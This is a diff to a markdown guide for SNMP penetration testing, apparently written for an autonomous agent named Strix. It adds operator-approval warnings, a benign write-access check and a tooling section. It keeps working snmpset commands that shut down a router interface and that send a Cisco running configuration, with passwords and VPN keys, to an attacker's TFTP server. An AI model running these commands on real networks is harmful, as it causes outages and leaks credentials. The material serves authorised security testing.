@@ -130,17 +130,25 @@ snmpwalk -v2c -c <community> <target> 1.3.6.1.4.1.77.1.2.25 # winUserTable
 
 If a write community string (`private`, `write`, etc.) is found:
 
-**Router/Switch Reconfiguration**
-```bash
-# Change system name
-snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.1.5.0 s "PWNED"
+> **Operator approval required for all write operations below.** Autonomous agents must NOT execute destructive SNMP SET commands without explicit operator authorization. Use only the benign `sysContact` change (shown in the Validation section) for autonomous write-access confirmation.
 
-# Disable an interface (operational disruption)
+**Safe Write Confirmation (autonomous)**
+```bash
+# Benign validation: change sysContact to prove write access
+snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.1.4.0 s "strix_write_test"
+snmpget -v2c -c <read_community> <target> 1.3.6.1.2.1.1.4.0  # Confirm change
+```
+
+**Destructive Operations (operator approval required)**
+```bash
+# ⚠️ DO NOT EXECUTE WITHOUT OPERATOR APPROVAL
+# Disable an interface (causes outage)
 snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.2.2.1.7.<if_index> i 2
 ```
 
-**TFTP Configuration Download (Cisco)**
+**TFTP Configuration Download — Cisco (operator approval required)**
 ```bash
+# ⚠️ DO NOT EXECUTE WITHOUT OPERATOR APPROVAL — extracts sensitive configuration
 # Trigger config backup to attacker TFTP server
 snmpset -v2c -c <write_community> <target> 1.3.6.1.4.1.9.2.1.55.<attacker_ip> s running-config
 ```
@@ -159,7 +167,7 @@ This retrieves the full router configuration including enable passwords, VPN key
 
 **Weak Authentication**
 - MD5 auth with short/default passwords
-- No encryption (authNoPriv) — credentials visible on wire
+- No encryption (authNoPriv) — scoped PDU data visible on wire (note: authentication passwords are NOT transmitted in plaintext under authNoPriv; the HMAC-based auth protects credentials, but management data traversing the wire is unencrypted)
 - DES encryption (known weak) instead of AES
 
 **Username Enumeration**
@@ -212,6 +220,24 @@ This retrieves the full router configuration including enable passwords, VPN key
 - **Lateral movement** — Discovered internal IPs, subnets, and VPN configurations enable pivoting
 - **Monitoring subversion** — Fake trap injection triggers false alerts or malicious automated responses
 - **Compliance violation** — SNMP v1/v2c cleartext on a network violates PCI DSS, HIPAA, and most security frameworks
+
+## Tooling
+
+The Strix sandbox includes `nmap` (with NSE scripts). Additional tools may need installation:
+
+```bash
+# Net-SNMP tools (snmpwalk, snmpset, snmpget, snmpbulkwalk)
+apt-get install -y snmp
+
+# onesixtyone — fast community string scanner
+apt-get install -y onesixtyone
+
+# Community string wordlists
+# SecLists: /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
+# If not available, use nmap's built-in snmp-brute script (no external wordlist needed)
+```
+
+Prefer `nmap` NSE scripts (`snmp-brute`, `snmp-info`, `snmp-v3-brute`) as the primary approach since they require no additional installation.
 
 ## Pro Tips
 
